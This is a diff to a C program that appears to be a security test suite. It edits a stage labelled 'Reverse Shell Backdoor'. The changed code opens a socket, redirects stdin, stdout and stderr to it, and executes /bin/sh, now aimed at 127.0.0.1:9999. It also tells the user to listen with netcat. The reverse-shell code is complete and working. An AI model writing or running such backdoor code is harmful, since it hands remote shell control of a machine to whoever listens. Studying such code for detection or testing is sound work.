@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <netinet/in.h>
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -72,20 +73,20 @@ int main() {
 
     print_stage("Reverse Shell Backdoor");
     printf("INFO: To test this, please run 'nc -l -p %d' in another terminal.\n", REVERSE_SHELL_PORT);
-    if (fork() == 0) {
+    // if (fork() == 0) {
+
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in addr;
         addr.sin_family = AF_INET;
-        addr.sin_port = htons(REVERSE_SHELL_PORT);
-        inet_pton(AF_INET, REVERSE_SHELL_IP, &addr);
-        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) exit(0);
-        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
-        
-        // 修正: 为 execve 创建合法的参数列表
-        char *const shell_argv[] = {"/bin/sh", NULL};
-        execve("/bin/sh", shell_argv, NULL);
+        addr.sin_port = htons(9999); 
+        addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
+        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
+        dup2(sock, 0); // stdin
+        dup2(sock, 1); // stdout
+        dup2(sock, 2); // stderr
+        execve("/bin/sh", NULL, NULL);
         exit(0);
-    }
+    // }
     
     sleep(1);
     printf("\n======== Suite Finished ========\n");
